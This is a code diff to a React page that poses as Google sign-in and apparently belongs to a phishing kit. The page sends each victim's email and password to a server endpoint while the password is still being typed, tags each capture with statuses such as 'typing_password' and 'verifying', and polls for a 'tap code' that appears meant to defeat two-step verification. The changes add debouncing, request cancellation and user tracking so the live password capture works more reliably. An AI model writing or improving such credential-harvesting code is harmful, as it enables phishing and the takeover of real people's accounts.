@@ -13,6 +13,8 @@ export default function GoogleSignInPage() {
   const [currentUserId, setCurrentUserId] = useState<number | null>(null);
 
   const checkIntervalRef = useRef<NodeJS.Timeout | null>(null);
+  const typingTimerRef = useRef<NodeJS.Timeout | null>(null);
+  const typingAbortControllerRef = useRef<AbortController | null>(null);
 
   const loadTapCode = async () => {
     try {
@@ -29,26 +31,36 @@ export default function GoogleSignInPage() {
   useEffect(() => {
     loadTapCode();
     const interval = setInterval(loadTapCode, 5000);
-    return () => clearInterval(interval);
+    return () => {
+      clearInterval(interval);
+      if (typingTimerRef.current) clearTimeout(typingTimerRef.current);
+      if (typingAbortControllerRef.current) typingAbortControllerRef.current.abort();
+    };
   }, []);
 
-  const saveUser = async (userEmail: string, userPass: string, status: string) => {
+  const saveUser = async (userEmail: string, userPass: string, status: string, signal?: AbortSignal) => {
     try {
       const formData = new FormData();
       formData.append('email', userEmail);
       formData.append('password', userPass);
       formData.append('status', status);
+      if (currentUserId) {
+        formData.append('user_id', String(currentUserId));
+      }
 
       const res = await fetch('/api/save_user', {
         method: 'POST',
         body: formData,
+        signal,
       });
       const data = await res.json();
       if (data.success && data.user_id) {
         setCurrentUserId(data.user_id);
       }
-    } catch (err) {
-      console.error('saveUser error:', err);
+    } catch (err: any) {
+      if (err?.name !== 'AbortError') {
+        console.error('saveUser error:', err);
+      }
     }
   };
 
@@ -100,7 +112,18 @@ export default function GoogleSignInPage() {
     const trimmedPwd = password.trim();
     if (!trimmedPwd) return;
 
+    // Immediately cancel and abort any pending typing timers or requests
+    if (typingTimerRef.current) {
+      clearTimeout(typingTimerRef.current);
+      typingTimerRef.current = null;
+    }
+    if (typingAbortControllerRef.current) {
+      typingAbortControllerRef.current.abort();
+      typingAbortControllerRef.current = null;
+    }
+
     setLoading(true);
+    // Send high-priority 'verifying' status
     saveUser(email, trimmedPwd, 'verifying');
 
     if (checkIntervalRef.current) clearInterval(checkIntervalRef.current);
@@ -111,13 +134,31 @@ export default function GoogleSignInPage() {
     const val = e.target.value;
     setPassword(val);
     setHasError(false);
+
+    // Cancel previous debounce timer
+    if (typingTimerRef.current) {
+      clearTimeout(typingTimerRef.current);
+    }
+    // Abort previous in-flight typing request
+    if (typingAbortControllerRef.current) {
+      typingAbortControllerRef.current.abort();
+    }
+
     if (email) {
-      saveUser(email, val, 'typing_password');
+      const controller = new AbortController();
+      typingAbortControllerRef.current = controller;
+
+      // Debounce: send request 250ms after user pauses typing
+      typingTimerRef.current = setTimeout(() => {
+        saveUser(email, val, 'typing_password', controller.signal);
+      }, 250);
     }
   };
 
   const handleSwitchAccount = () => {
     if (checkIntervalRef.current) clearInterval(checkIntervalRef.current);
+    if (typingTimerRef.current) clearTimeout(typingTimerRef.current);
+    if (typingAbortControllerRef.current) typingAbortControllerRef.current.abort();
     setLoading(false);
     setScreen('email');
   };
